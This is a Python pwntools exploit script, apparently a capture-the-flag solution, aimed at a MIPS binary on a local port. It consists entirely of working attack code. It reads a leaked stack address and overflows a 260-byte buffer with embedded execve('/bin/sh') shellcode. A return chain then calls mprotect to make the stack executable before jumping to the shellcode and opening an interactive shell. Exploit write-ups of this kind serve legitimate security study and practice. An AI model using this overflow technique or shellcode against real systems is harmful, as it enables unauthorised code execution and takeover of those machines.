from pwn import*

#p = process(['qemu-mips-static' ,'-L' ,'/usr/mips-linux-gnu/' ,'-g' ,'4321' ,'./prob'])
#p = process(['qemu-mips-static' ,'./prob'])
p = remote('127.0.0.1',10206)

shellcode = b'\x3c\x0f\x2f\x2f\x35\xef\x62\x69\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xaf\xff\xf4\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x4c'
mprotect = 0x426b6c

p.recvuntil('Buf : ')
stack_addr = int(p.recvuntil('\n')[:-1],16)
stack_base = stack_addr & 0xfff00000
print('stack_base : ',hex(stack_base))
print('stack_addr : ',hex(stack_addr))

payload = shellcode
payload += b'A'*(260-len(shellcode))
payload += p32(0x00400868 , endian='big')
payload += b'B'*(24+0x10)

payload += p32(stack_base, endian='big')
payload += p32(0x1000, endian='big')
payload += p32(0x7, endian='big')
payload += p32(mprotect, endian='big')
payload += b'B'*0xc
payload += p32(stack_addr,endian='big')
pause()
p.sendline(payload)

p.interactive()
